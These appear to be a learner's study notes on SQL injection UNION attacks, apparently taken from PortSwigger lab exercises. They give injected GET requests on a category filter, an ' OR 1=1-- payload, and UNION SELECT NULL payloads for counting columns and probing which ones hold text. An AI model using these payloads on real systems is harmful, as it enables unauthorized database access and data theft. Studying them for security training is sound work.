** WHEN SEARCHING FOR SQL IN HEADERS, LOOK FOR 'GET' WITH 'FILTER?' 'SEARCH?' ETC.
THEN CREATE A NEW HEADER AND APPEND A ' TO THE END AND SEND HEADER. THIS WILL RESPOND WITH A SERVER ERROR.

THEN START ENUMARTING (SEARCH FOR HOW MANY COLUMNS ARE IN THE TABLE)

IE: 
1. (RECV) RECEIVE RESPONSE TO PROBE:
GET /FILTER?CATERGORY=FOOD+%25+DRINK-- HTTP/1.1 
2. (SEND)(TEST SERVER BY ADDING ')
GET /FILTER?CATERGORY=FOOD+%25+DRINK'-- HTTP/1.1 
3. USE RETURN HEADER TO PROBE SERVER FOR HOW MANY 
(RECV)GET /FILTER?CATERGORY=FOOD+%25+DRINK'UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1 
RETRIEVING HIDDEN DATA
--> RECEIVE HEADER WILL RETURN ERROR UNTIL CORRECT AMOUNT OF COLUMNS ARE ENUMERATED
--> BE SURE TO ALWAYS INCLUDE THE AMOUNT OF COLUMNS IN THE SENDING HEADER MATCH THE TOTAL AMOUNT OF HEADERS IN THE DB (USE NULL, TO FILL IN EMPTY COLUMNS.)
3. FIND COLUMNS FOR SPECIFIC DATA TYPES: (STRING)
GET /FILTER?CATERGORY=FOOD+%25+DRINK'+UNION+SELECT+'abcdef',NULL,NULL-- HTTP/1.1 

'+OR+1=1--

https://portswigger.net/web-security/sql-injection/cheat-sheet

SQL injection UNION attacks
UNION --> ALLOWS TO EXECUTE ADDITIONAL 'SELECT QUERIES' and append to original query: 

SELECT a, b FROM table1 UNION SELECT c, d FROM table2

--> This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2. 
--> For a UNION query to work, two key requirements must be met:

   1. The individual queries must return the same number of columns.
   2. The data types in each column must be compatible between the individual queries.


TO FIND # OF COLUMNS (UNION CONTINUED) 
The   method involves submitting a series of UNION SELECT payloads specifying a different number of null values:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

* EVERY SQL DATABASE WILL HAVE DIFFERNT PROVIDERS, WHICH CAN ALTER THE COMMANDS, REFER TO: 
https://portswigger.net/web-security/sql-injection/cheat-sheet

Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--


* FINDING A COLUMN THAT CONTAINS TEXT 

1. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
'+UNION+SELECT+NULL,NULL,NULL--

2. Try replacing each null with the random value provided by the lab, for example:
'+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead. 
